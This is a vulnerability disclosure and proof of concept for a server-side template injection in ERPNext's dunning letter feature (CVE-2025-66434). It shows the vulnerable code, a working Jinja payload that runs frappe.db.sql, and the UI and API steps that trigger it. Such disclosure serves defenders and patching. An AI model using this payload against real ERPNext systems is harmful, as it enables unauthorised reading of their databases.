**SSTI on ERPNEXT ≤ 15.89.0 (CVE-2025-66434)**

**Exploit Author: An Chu ( aka iamanc )**

**Vendor:** Frappe Technologies Pvt. Ltd.

**Product:** ERPNext

**Affected Versions:** ERPNext ≤ 15.89.0

**CVE:  CVE-2025-66434**

**Impact:** 

An authenticated attacker can exploit this vulnerability to execute arbitrary SQL queries via server-side template injection, resulting in disclosure of sensitive database information.

**Summary**:

A Server-Side Template Injection (SSTI) vulnerability exists in the `get_dunning_letter_text` function of Frappe ERPNext 15.70.2.

The function renders attacker-controlled Jinja2 templates (`body_text`) using `frappe.render_template()` with a user-supplied context (`doc`). Although ERPNext uses a custom Jinja2 `SandboxedEnvironment`, dangerous globals such as `frappe.db.sql` remain accessible via `get_safe_globals()`.

An authenticated attacker with permission to configure **Dunning Type** and **Dunning Letter Text** can inject arbitrary Jinja expressions. This results in server-side code execution within a restricted—but unsafe—context and enables potential database information disclosure.

**Technical Details:**

ERPNext is an open-source ERP system built on the Frappe Framework, which is written in Python and uses MariaDB/MySQL as its backend database.

**HTTP Routing in Frappe**

- Frappe exposes backend Python functions through HTTP endpoints.
- The endpoint format is :

```php
/api/method/<python.module.path>.<function_name>
```

•  When a request is sent to this URL, Frappe resolves the module path and **executes the corresponding Python function directly**.

**@frappe.whitelist()**

- The `@frappe.whitelist()` decorator **exposes a Python function as a public HTTP API**.
- Whitelisted functions:
    - Accept parameters directly from user-controlled HTTP requests
    - Do not enforce input validation by default
- This decorator defines the **attack entry point** for this vulnerability.

Example: 

Source code

```php
@frappe.whitelist()
def test(a, b):
    return a + b
```

Request

```php
POST /api/method/module.test
a=1&b=2
```

**Vulnerable Template Rendering:**

frappe uses frappe.render_template(template, context) to render Jinja2 templates. Even with SandboxedEnvironment, dangerous globals remain:

```php
from frappe import render_template, get_safe_globals

render_template(user_template, user_context)
```

`get_safe_globals()` exposes:

- frappe.db.sql
- frappe.get_doc
- frappe.throw
- frappe.local

If a malicious Jinja expression is injected, attacker can execute Python code in this restricted environment and query the database.

**Vulnerable Functions Analysis:**

**Vulnerable source code:**

File: erpnext/accounts/doctype/dunning/dunning.py

```php
@frappe.whitelist()
def get_dunning_letter_text(dunning_type: str, doc: str | dict, language: str | None = None) -> dict:
	DOCTYPE = "Dunning Letter Text"
	FIELDS = ["body_text", "closing_text", "language"]

	if isinstance(doc, str):
		doc = json.loads(doc)

	if not language:
		language = doc.get("language")

	letter_text = None
	if language:
		letter_text = frappe.db.get_value(
			DOCTYPE, {"parent": dunning_type, "language": language}, FIELDS, as_dict=1
		)

	if not letter_text:
		letter_text = frappe.db.get_value(
			DOCTYPE, {"parent": dunning_type, "is_default_language": 1}, FIELDS, as_dict=1
		)

	if not letter_text:
		return {}

	return {
		"body_text": frappe.render_template(letter_text.body_text, doc),
		"closing_text": frappe.render_template(letter_text.closing_text, doc),
		"language": letter_text.language,
	}
```

**Root Cause**

```python
"body_text": frappe.render_template(letter_text.body_text, doc)
```

- `body_text` is loaded directly from the **Dunning Letter Text** child table.
- This field is **fully user‑controlled** by authenticated users with permission to manage *Dunning Type*.
- The value is rendered using `frappe.render_template()` **without sanitization**.
- The Jinja2 environment exposes unsafe globals via `get_safe_globals()`, including `frappe.db.sql`.

As a result, an authenticated attacker can inject arbitrary Jinja2 expressions leading to **Server‑Side** Template Injection (SSTI).

**PoC:**
**Step 1: Inject SSTI Payload via UI**

Navigate to:

Accounting → Accounts Receivable → Dunning Type

Create or edit a Dunning Type.

In the Dunning Letter Text child table, set the Body Text field to:

{{ frappe.db.sql("SELECT @@version") }}

Save the document.

<img width="1363" height="676" alt="image" src="https://github.com/user-attachments/assets/7716953b-b94a-4220-bb50-8367b58f0f14" />


At this stage, the payload is stored but not yet executed.

`body_text` = \{\{ frappe.db.sql("SELECT @@version") \}\}//iamanc
<img width="1400" height="400" alt="image" src="https://github.com/user-attachments/assets/06a9e8f0-b233-4ed0-82e6-8d699c980a85" />

**Step 2: Trigger SSTI via UI** 

Navigate to:

Accounting →  Dunning -> New Dunning


Select:

Dunning Type: SSTI-Test2



<img width="1573" height="850" alt="image" src="https://github.com/user-attachments/assets/6b056b9a-4ab6-436b-8e23-a605362509de" />


When the Dunning form loads and processes the selected Dunning Type, the backend automatically invokes:

get_dunning_letter_text(dunning_type, doc, language)

During execution, the injected payload inside body_text is rendered by:

frappe.render_template(letter_text.body_text, doc)

<img width="1660" height="400" alt="image" src="https://github.com/user-attachments/assets/d99a8a0f-6fd3-461b-ade3-e60e3026568f" />


Observe that:

The literal payload {{ ... }} is no longer visible.

The rendered output contains the database version, for example:

10.6.24-MariaDB-ubu2204

This confirms that the SSTI payload is successfully executed on the server.

**Alternative Trigger: Direct API Invocation**

The same vulnerability can be triggered by directly calling the whitelisted method:

```
POST /api/method/erpnext.accounts.doctype.dunning.dunning.get_dunning_letter_text

```

When the API processes the request, the injected `body_text` is rendered and the SSTI payload is executed, returning the evaluated output in the response.

<img width="1500" height="400" alt="image" src="https://github.com/user-attachments/assets/424b198c-89f7-47e1-a378-bf5efd84263b" />
